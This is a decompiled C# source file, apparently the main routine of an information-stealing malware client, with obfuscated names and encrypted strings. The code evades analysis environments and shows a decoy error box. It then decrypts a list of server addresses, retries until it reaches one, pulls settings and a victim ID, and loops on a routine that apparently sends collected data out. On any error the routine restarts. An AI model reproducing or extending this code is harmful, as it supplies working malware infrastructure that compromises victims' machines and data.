using System;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;

// Token: 0x0200000A RID: 10
public static class Program
{
	// Token: 0x06000045 RID: 69 RVA: 0x00004AA0 File Offset: 0x00002EA0
	private static void Main(string[] args)
	{
		Program.WriteLine();
	}

	// Token: 0x06000046 RID: 70 RVA: 0x00004AAC File Offset: 0x00002EAC
	public static void WriteLine()
	{
		try
		{
			bool flag = EnvironmentChecker.Check();
			if (flag)
			{
				Environment.Exit(0);
			}
			bool flag2 = !string.IsNullOrWhiteSpace(Arguments.Message);
			if (flag2)
			{
				Task.Factory.StartNew<MessageBoxResult>(() => MessageBox.Show(StringDecrypt.Read(Arguments.Message, Arguments.Key), "", MessageBoxButton.OK, MessageBoxImage.Hand));
			}
			ConnectionProvider connectionProvider = new ConnectionProvider();
			bool flag3 = false;
			while (!flag3)
			{
				foreach (string address in StringDecrypt.Read(Arguments.IP, Arguments.Key).Split(new char[]
				{
					'|'
				}))
				{
					bool flag4 = connectionProvider.Id1(address);
					if (flag4)
					{
						flag3 = true;
						break;
					}
				}
				Thread.Sleep(5000);
			}
			Entity2 settings = new Entity2();
			while (!connectionProvider.Id5(out settings))
			{
				bool flag5 = !connectionProvider.Id3();
				if (flag5)
				{
					throw new Exception();
				}
				Thread.Sleep(1000);
			}
			Entity7 entity = new Entity7
			{
				Id2 = StringDecrypt.Read(Arguments.ID, Arguments.Key)
			};
			EntityResolver entityResolver = ItemBase.Extract<EntityResolver>();
			while (!entityResolver.Invoker(connectionProvider, settings, ref entity))
			{
				Thread.Sleep(5000);
			}
		}
		catch (Exception ex)
		{
			Program.WriteLine();
		}
	}
}
